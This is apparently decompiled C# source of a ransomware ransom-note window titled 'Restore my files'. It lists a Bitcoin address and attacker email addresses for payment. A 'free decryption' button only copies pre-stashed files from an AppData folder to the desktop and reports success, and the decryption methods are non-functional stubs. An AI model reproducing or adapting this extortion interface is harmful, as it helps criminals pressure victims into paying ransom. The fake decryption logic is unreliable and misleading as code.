using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using UnlockYourFiles.Login;

namespace LoginModern;

public class registro : Form
{
	internal IContainer icontainer_0;

	internal PictureBox btnMinimizar;

	internal PictureBox btnCerrar;

	internal Label label1;

	internal Button btnlogin;

	internal Label label2;

	internal Label label8;

	internal TextBox textBox1;

	internal TextBox textBox2;

	internal Label label9;

	internal Label label10;

	internal Label label4;

	public registro()
	{
		IContainer container = (icontainer_0 = null);
		((Form)this)._002Ector();
		InitializeComponent();
	}

	private void btnMinimizar_Click(object sender, EventArgs e)
	{
		((Form)this).set_WindowState((FormWindowState)1);
	}

	private void btnCerrar_Click(object sender, EventArgs e)
	{
		((Form)this).Close();
	}

	private void registro_MouseDown(object sender, MouseEventArgs e)
	{
	}

	private void label2_Click(object sender, EventArgs e)
	{
	}

	private void registro_Load(object sender, EventArgs e)
	{
	}

	private void textBox2_TextChanged(object sender, EventArgs e)
	{
	}

	private void btnlogin_Click(object sender, EventArgs e)
	{
		((Control)btnlogin).set_Cursor(Cursors.get_WaitCursor());
		Thread.Sleep(700);
		method_0();
		Thread.Sleep(100);
		((Control)btnlogin).set_Cursor(Cursors.get_Hand());
	}

	private void method_0()
	{
		//IL_006c: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
		string text = "BascordApp";
		string text2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + text + "\\filesx0\\";
		string text3 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\filesx0\\";
		try
		{
			if (Directory.Exists(text3))
			{
				Directory.Delete(text3, recursive: true);
			}
			if (Directory.Exists(text2))
			{
				method_1(text2, text3);
				msgbox msgbox = new msgbox();
				((Control)msgbox).Hide();
				msgbox.changeLabel("Free files decrypted succesfully!");
				((Form)msgbox).ShowDialog();
				((Component)(object)msgbox).Dispose();
				Process.Start(text3);
				if (Directory.Exists(text2))
				{
					Process.Start(text3);
				}
			}
			else
			{
				msgbox msgbox = new msgbox();
				((Control)msgbox).Hide();
				msgbox.changeLabel("An error accurred. Please try again or contact us with email address");
				((Form)msgbox).ShowDialog();
				((Component)(object)msgbox).Dispose();
			}
		}
		catch
		{
			msgbox msgbox = new msgbox();
			((Control)msgbox).Hide();
			msgbox.changeLabel("Free files decrypted succesfully!");
			((Form)msgbox).ShowDialog();
			((Component)(object)msgbox).Dispose();
			if (Directory.Exists(text2))
			{
				Process.Start(text3);
			}
		}
	}

	private void method_1(string string_0, string string_1)
	{
		if (!Directory.Exists(string_1))
		{
			Directory.CreateDirectory(string_1);
		}
		string[] files = Directory.GetFiles(string_0);
		string[] array = files;
		foreach (string text in array)
		{
			string fileName = Path.GetFileName(text);
			string destFileName = Path.Combine(string_1, fileName);
			File.Copy(text, destFileName);
		}
		string[] directories = Directory.GetDirectories(string_0);
		array = directories;
		foreach (string text2 in array)
		{
			string fileName = Path.GetFileName(text2);
			string destFileName = Path.Combine(string_1, fileName);
			method_1(text2, destFileName);
		}
	}

	public void DecryptAllFile(string file, string password)
	{
		File.ReadAllBytes(file);
		string extension = Path.GetExtension(file);
		string destFileName = file.Substring(0, file.Length - extension.Length);
		File.Move(file, destFileName);
	}

	public byte[] AES_Only_Decrypt_File(byte[] bytesToBeDecrypted, byte[] passwordBytes)
	{
		byte[] result = null;
		_ = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using (new MemoryStream())
		{
		}
		return result;
	}

	private void label10_Click(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_0017: Expected O, but got Unknown
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Expected O, but got Unknown
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_003f: Expected O, but got Unknown
		//IL_0047: Unknown result type (might be due to invalid IL or missing references)
		//IL_004e: Expected O, but got Unknown
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_0065: Unknown result type (might be due to invalid IL or missing references)
		//IL_006c: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007b: Expected O, but got Unknown
		//IL_0083: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Expected O, but got Unknown
		//IL_0092: Unknown result type (might be due to invalid IL or missing references)
		//IL_0099: Expected O, but got Unknown
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a8: Expected O, but got Unknown
		//IL_00dc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e6: Expected O, but got Unknown
		//IL_0184: Unknown result type (might be due to invalid IL or missing references)
		//IL_018e: Expected O, but got Unknown
		//IL_0224: Unknown result type (might be due to invalid IL or missing references)
		//IL_022e: Expected O, but got Unknown
		//IL_0325: Unknown result type (might be due to invalid IL or missing references)
		//IL_032f: Expected O, but got Unknown
		//IL_03d3: Unknown result type (might be due to invalid IL or missing references)
		//IL_03dd: Expected O, but got Unknown
		//IL_0478: Unknown result type (might be due to invalid IL or missing references)
		//IL_0482: Expected O, but got Unknown
		//IL_0522: Unknown result type (might be due to invalid IL or missing references)
		//IL_052c: Expected O, but got Unknown
		//IL_05e7: Unknown result type (might be due to invalid IL or missing references)
		//IL_05f1: Expected O, but got Unknown
		//IL_06a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_06ab: Expected O, but got Unknown
		//IL_0729: Unknown result type (might be due to invalid IL or missing references)
		//IL_0733: Expected O, but got Unknown
		//IL_07e0: Unknown result type (might be due to invalid IL or missing references)
		//IL_07ea: Expected O, but got Unknown
		//IL_0978: Unknown result type (might be due to invalid IL or missing references)
		//IL_0982: Expected O, but got Unknown
		//IL_09b9: Unknown result type (might be due to invalid IL or missing references)
		//IL_09c3: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(registro));
		PictureBox val = (btnMinimizar = new PictureBox());
		PictureBox val2 = (btnCerrar = new PictureBox());
		Label val3 = (label1 = new Label());
		Button val4 = (btnlogin = new Button());
		Label val5 = (label2 = new Label());
		Label val6 = (label8 = new Label());
		TextBox val7 = (textBox1 = new TextBox());
		TextBox val8 = (textBox2 = new TextBox());
		Label val9 = (label9 = new Label());
		Label val10 = (label10 = new Label());
		Label val11 = (label4 = new Label());
		((ISupportInitialize)btnMinimizar).BeginInit();
		((ISupportInitialize)btnCerrar).BeginInit();
		((Control)this).SuspendLayout();
		btnMinimizar.set_Image((Image)componentResourceManager.GetObject("btnMinimizar.Image"));
		((Control)btnMinimizar).set_Location(new Point(768, 9));
		((Control)btnMinimizar).set_Name("btnMinimizar");
		((Control)btnMinimizar).set_Size(new Size(25, 25));
		btnMinimizar.set_SizeMode((PictureBoxSizeMode)3);
		btnMinimizar.set_TabIndex(11);
		btnMinimizar.set_TabStop(false);
		((Control)btnMinimizar).add_Click((EventHandler)btnMinimizar_Click);
		((Control)btnCerrar).set_BackColor(Color.FromArgb(15, 15, 15));
		btnCerrar.set_Image((Image)componentResourceManager.GetObject("btnCerrar.Image"));
		((Control)btnCerrar).set_Location(new Point(799, 9));
		((Control)btnCerrar).set_Name("btnCerrar");
		((Control)btnCerrar).set_Size(new Size(25, 25));
		btnCerrar.set_SizeMode((PictureBoxSizeMode)3);
		btnCerrar.set_TabIndex(10);
		btnCerrar.set_TabStop(false);
		((Control)btnCerrar).add_Click((EventHandler)btnCerrar_Click);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 18f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_ForeColor(Color.White);
		((Control)label1).set_Location(new Point(286, 10));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(281, 29));
		((Control)label1).set_TabIndex(9);
		((Control)label1).set_Text("How can I get password?");
		((Control)btnlogin).set_BackColor(Color.FromArgb(40, 40, 40));
		((Control)btnlogin).set_Cursor(Cursors.get_Hand());
		((ButtonBase)btnlogin).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)btnlogin).get_FlatAppearance().set_MouseDownBackColor(Color.FromArgb(28, 28, 28));
		((ButtonBase)btnlogin).get_FlatAppearance().set_MouseOverBackColor(Color.FromArgb(64, 64, 64));
		((ButtonBase)btnlogin).set_FlatStyle((FlatStyle)0);
		((Control)btnlogin).set_Font(new Font("Microsoft Sans Serif", 14.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)btnlogin).set_ForeColor(Color.LightGray);
		((Control)btnlogin).set_Location(new Point(222, 396));
		((Control)btnlogin).set_Name("btnlogin");
		((Control)btnlogin).set_Size(new Size(408, 40));
		((Control)btnlogin).set_TabIndex(19);
		((Control)btnlogin).set_Text("Restore some files for free");
		((ButtonBase)btnlogin).set_UseVisualStyleBackColor(false);
		((Control)btnlogin).add_Click((EventHandler)btnlogin_Click);
		((Control)label2).set_Font(new Font("Microsoft Sans Serif", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_ForeColor(Color.White);
		((Control)label2).set_Location(new Point(16, 70));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(821, 157));
		((Control)label2).set_TabIndex(20);
		((Control)label2).set_Text(componentResourceManager.GetString("label2.Text"));
		((Control)label2).add_Click((EventHandler)label2_Click);
		((Control)label8).set_Font(new Font("Microsoft Sans Serif", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label8).set_ForeColor(Color.White);
		((Control)label8).set_Location(new Point(16, 242));
		((Control)label8).set_Name("label8");
		((Control)label8).set_Size(new Size(189, 27));
		((Control)label8).set_TabIndex(26);
		((Control)label8).set_Text("Our bitcoin address:");
		((Control)textBox1).set_BackColor(Color.FromArgb(15, 15, 15));
		((TextBoxBase)textBox1).set_BorderStyle((BorderStyle)1);
		((Control)textBox1).set_Font(new Font("Microsoft Sans Serif", 14.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)textBox1).set_ForeColor(Color.White);
		((Control)textBox1).set_Location(new Point(211, 239));
		((TextBoxBase)textBox1).set_Multiline(true);
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(613, 30));
		((Control)textBox1).set_TabIndex(27);
		((Control)textBox1).set_Text("bc1qlnzcep4l4ac0ttdrq7awxev9ehu465f2vpt9x0");
		textBox1.set_TextAlign((HorizontalAlignment)2);
		((Control)textBox2).set_BackColor(Color.FromArgb(15, 15, 15));
		((TextBoxBase)textBox2).set_BorderStyle((BorderStyle)1);
		((Control)textBox2).set_Font(new Font("Microsoft Sans Serif", 14.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)textBox2).set_ForeColor(Color.White);
		((Control)textBox2).set_Location(new Point(211, 275));
		((TextBoxBase)textBox2).set_Multiline(true);
		((Control)textBox2).set_Name("textBox2");
		((Control)textBox2).set_Size(new Size(613, 30));
		((Control)textBox2).set_TabIndex(29);
		((Control)textBox2).set_Text("4lok3r@protonmail.com   or   4lok3r@tutanota.com");
		textBox2.set_TextAlign((HorizontalAlignment)2);
		((Control)textBox2).add_TextChanged((EventHandler)textBox2_TextChanged);
		((Control)label9).set_Font(new Font("Microsoft Sans Serif", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label9).set_ForeColor(Color.White);
		((Control)label9).set_Location(new Point(16, 278));
		((Control)label9).set_Name("label9");
		((Control)label9).set_Size(new Size(189, 27));
		((Control)label9).set_TabIndex(28);
		((Control)label9).set_Text("Our email address:");
		((Control)label10).set_Font(new Font("Microsoft Sans Serif", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label10).set_ForeColor(Color.White);
		((Control)label10).set_Location(new Point(16, 326));
		((Control)label10).set_Name("label10");
		((Control)label10).set_Size(new Size(850, 58));
		((Control)label10).set_TabIndex(30);
		((Control)label10).set_Text("Before paying you can restore a few files for free. Please not that it won't decrypt all your files. It just\r\nproves that all your files can be decrypted");
		((Control)label10).add_Click((EventHandler)label10_Click);
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_CausesValidation(false);
		((Control)label4).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)4, (GraphicsUnit)3, (byte)0));
		((Control)label4).set_ForeColor(Color.DarkGray);
		((Control)label4).set_Location(new Point(17, 39));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(820, 13));
		((Control)label4).set_TabIndex(22);
		((Control)label4).set_Tag((object)"         ");
		((Control)label4).set_Text(componentResourceManager.GetString("label4.Text"));
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.FromArgb(15, 15, 15));
		((Form)this).set_ClientSize(new Size(842, 450));
		((Control)this).get_Controls().Add((Control)(object)label10);
		((Control)this).get_Controls().Add((Control)(object)textBox2);
		((Control)this).get_Controls().Add((Control)(object)label9);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)label8);
		((Control)this).get_Controls().Add((Control)(object)label4);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)btnlogin);
		((Control)this).get_Controls().Add((Control)(object)btnMinimizar);
		((Control)this).get_Controls().Add((Control)(object)btnCerrar);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("registro");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Restore my files");
		((Form)this).add_Load((EventHandler)registro_Load);
		((Control)this).add_MouseDown(new MouseEventHandler(registro_MouseDown));
		((ISupportInitialize)btnMinimizar).EndInit();
		((ISupportInitialize)btnCerrar).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
